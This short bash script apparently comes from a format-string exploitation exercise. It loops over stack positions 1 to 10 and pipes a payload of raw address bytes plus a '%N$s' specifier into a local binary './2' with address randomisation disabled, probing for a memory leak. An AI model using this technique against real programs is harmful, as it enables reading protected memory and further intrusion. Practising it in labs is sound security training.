#!/bin/bash

for i in {1..10}
do
	echo "i: $i"
	echo -ne "\xa0\xd4\x1b\x11%$i\$s" | setarch `arch` -R ./2
	echo
	echo
done
